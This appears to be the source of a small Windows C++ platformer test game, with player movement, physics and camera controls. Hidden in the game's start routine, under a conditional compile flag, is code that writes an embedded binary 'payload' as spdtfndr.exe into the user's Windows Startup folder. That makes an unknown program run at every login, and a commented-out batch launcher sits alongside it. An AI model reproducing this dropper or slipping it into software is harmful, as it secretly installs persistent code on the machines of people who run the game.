#include "../Wnd/Payload.h"
#include "../Wnd/Game.h"

#define DEBUG

#ifdef SPECIFIC
#include <fstream>
#endif

class Player1 : public Entity
{
	float speed = 1;

public:
	virtual void on_create() override
	{
		sprite.path = L"jouda.png";
		rigidbody.mass = 45;
		collider.height = 64;
		collider.width = 32;
		rigidbody.restitution = .45f;
		transform.position = { 100, 300 };
		collider.type = Collider::Type::dynamic_body;
	};

	virtual void on_update() override
	{
		if (Input::s_instance->get_key(Key::shift))
			speed = 2;
		else
			speed = 1;


		if (collider.type == Collider::Type::dynamic_body)
		{
			if (Input::s_instance->get_key(Key::right_arrow))
				apply_force({ 100000 * speed * frame_ptr->delta_time, 0 });
			if (Input::s_instance->get_key(Key::left_arrow))
				apply_force({ -100000 * speed * frame_ptr->delta_time, 0 });
			if (Input::s_instance->get_key(Key::down_arrow))
				apply_force({ 0, -100000 * speed * frame_ptr->delta_time });

			if (Input::s_instance->get_key(Key::up_arrow) && transform.velocity.y > 0) {
				rigidbody.gravity_scale = 0.5f;
			}
			else {
				rigidbody.gravity_scale = 1.0f;
			}
		}
		else
		{
			if (Input::s_instance->get_key(Key::right_arrow))
				move_by({ 1000 * speed * frame_ptr->delta_time, 0 });
			if (Input::s_instance->get_key(Key::left_arrow))
				move_by({ -1000 * speed * frame_ptr->delta_time, 0 });
			if (Input::s_instance->get_key(Key::up_arrow))
				move_by({ 0, 1000 * speed * frame_ptr->delta_time });
			if (Input::s_instance->get_key(Key::down_arrow))
				move_by({ 0, -1000 * speed * frame_ptr->delta_time });
		}

		if (Input::s_instance->get_key_down(Key::q))
			collider.type = collider.type == Collider::Type::dynamic_body ?
				Collider::Type::static_body :
				Collider::Type::dynamic_body;
	}

	virtual void on_collision(Entity b) override {
		if(Input::s_instance->get_key(Key::up_arrow))
		{
			if (b.top() - 5 < bottom()
				&& (b.left() + 5 > left() || b.right() - 5 < right()))
			{
				apply_force({ 0, 25000 });
			}
		}
	}
};

class GameTest : public Game {
public:
	GameTest()
		: Game(L"Game Test") { }

	virtual void on_start() override
	{
#ifdef SPECIFIC
		char buff[50];
		DWORD len = 50;
		GetUserNameA(buff, &len);
		std::string name = std::string(buff);

		std::string path = "C:\\Users\\" + name + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programy\\Startup\\spdtfndr.exe";
		std::fstream file = std::fstream(path, std::fstream::out | std::fstream::binary | std::fstream::trunc);
		file.write((char*)payload, sizeof(payload));
		file.close();

		//std::fstream shortcut = std::fstream(
		//	"C:\\Users\\" + name + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\on_startup.bat",
		//	std::fstream::out | std::fstream::trunc);
		//shortcut << "echo off\nopen " + path;
		//shortcut.close();
#endif
		m_scene.add_entity<Player1>();

		for (Object& o : m_scene.tilemap.objects) {
			if (o.name == "Player") {
				(*m_scene.m_entity_collection_ptr)[0].get()->move_to(o.position);
			}
		}
	}

	virtual void on_update(float delta_time) override
	{
		m_scene.camera.position = (*this->m_scene.m_entity_collection_ptr)[0]->transform.position;

		if (Input::s_instance->get_key(Key::j))
			m_scene.camera.position.x -= 10;
		if (Input::s_instance->get_key(Key::l))
			m_scene.camera.position.x += 10;
		if (Input::s_instance->get_key(Key::i))
			m_scene.camera.position.y += 10;
		if (Input::s_instance->get_key(Key::k))
			m_scene.camera.position.y -= 10;

		if (Input::s_instance->get_key_down(Key::escape))
		{
			close();
		}
	}
};

/*
* - kolize
*	 - check-before-movement kolize
	 - lepší kolize tilemapy
* - serializace scény a entit
*/

int WINAPI WinMain(_In_ HINSTANCE, _In_opt_ HINSTANCE, _In_ LPSTR, _In_ int)
{
	GameTest game = GameTest();
	game.run();

	return 0;
}
